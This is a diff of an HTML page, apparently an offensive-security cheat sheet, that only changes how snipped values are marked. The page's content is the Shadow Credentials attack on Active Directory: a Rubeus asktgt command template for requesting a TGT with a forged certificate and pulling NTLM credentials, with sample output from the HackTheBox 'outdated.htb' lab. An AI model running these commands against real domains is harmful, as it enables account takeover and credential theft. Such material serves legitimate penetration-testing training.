@@ -260,11 +260,11 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] Updated the msDS-KeyCredentialLink attribute of the target object
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] You can now run Rubeus with the following syntax:
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz ... [SNIP]... TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Rubeus.exe asktgt /user:sflowers /certificate:MIIJuAIBAz .---[SNIP]--- TvhwICB9A= /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 </span></span></span></div></pre></div><h4 id="2-request-a-tgt-using-the-pfx-file-and-get-ntlm-hash">2. Request a TGT Using the PFX File and Get NTLM Hash</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><div class="buttons-container"><button class="copy-code-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" width="16px" height="16px"><path d="M0 0h24v24H0V0z" fill="none"></path><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"></path></svg></button><button class="sample-output-button" type="button"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 -5 24 24" width="16px" height="16px" fill="currentColor"><path d="M11.29 15.88L6.7 11.29a1 1 0 0 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 0 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0zm0-6l-4.59-4.59a1 1 0 1 1 1.42-1.42l3.88 3.88 3.88-3.88a1 1 0 1 1 1.42 1.42l-4.59 4.59a1 1 0 0 1-1.42 0z"></path></svg></button></div><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\rubeus.exe asktgt /user:'<span class="o editable-keyword">&lt;TARGET_USER&gt;</span>' /certificate:'<span class="o editable-keyword">&lt;BASE64_PFX&gt;</span>' /password:'<span class="o editable-keyword">&lt;PFX_PASSWORD&gt;</span>' /domain:<span class="o editable-keyword">&lt;DOMAIN&gt;</span> /dc:<span class="o editable-keyword">&lt;DC&gt;</span> /getcredentials /show
 </span></span></span></code><div class="output-bubble">Sample Output:
-<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz ... [SNIP]... TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
+<span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\Rubeus.exe asktgt /user:sflowers /certificate:'MIIJuAIBAz .---[SNIP]--- TvhwICB9A=' /password:"Test1234" /domain:outdated.htb /dc:10.10.11.175 /getcredentials /show
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">   ______        _                      
 </span></span></span><span class="line"><span class="cl"><span class="go">  (_____ \      | |                     
@@ -283,7 +283,7 @@ TO-DO</div></pre></div><div class="highlight codeBlock-end"><pre tabindex="0" cl
 </span></span></span><span class="line"><span class="cl"><span class="go">[+] TGT request successful!
 </span></span></span><span class="line"><span class="cl"><span class="go">[*] base64(ticket.kirbi):
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
-</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIF0jCCBc ...[SNIP]... F0ZWQuaHRi
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">      doIF0jCCBc ---[SNIP]--- F0ZWQuaHRi
 </span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
 </span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  ServiceName              :  krbtgt/outdated.htb
 </span></span></span><span class="line"><span class="cl"><span class="go">  ServiceRealm             :  OUTDATED.HTB
